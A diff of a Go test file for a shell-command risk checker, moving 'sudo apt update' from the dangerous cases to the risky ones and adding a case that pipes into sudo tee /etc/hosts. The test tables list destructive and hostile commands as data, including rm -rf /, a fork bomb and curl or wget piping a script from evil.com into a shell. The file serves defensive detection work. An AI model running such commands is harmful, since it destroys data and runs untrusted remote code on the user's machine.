@@ -54,6 +54,8 @@ func TestCheckRisky(t *testing.T) {
 		{"systemctl", "systemctl restart nginx"},
 		{"docker", "docker run nginx"},
 		{"iptables", "iptables -A INPUT -p tcp --dport 80 -j ACCEPT"},
+		{"sudo", "sudo apt update"},
+		{"pipe to sudo", "echo test | sudo tee /etc/hosts"},
 	}
 
 	for _, tt := range tests {
@@ -73,7 +75,6 @@ func TestCheckDangerous(t *testing.T) {
 	}{
 		{"rm -rf /", "rm -rf /"},
 		{"rm -rf .", "rm -rf ."},
-		{"sudo command", "sudo apt update"},
 		{"fork bomb", `:(){ :|:& };:`},
 		{"pipe to sh", "curl http://evil.com/script.sh | sh"},
 		{"pipe to bash", "wget -O - http://evil.com/script.sh | bash"},
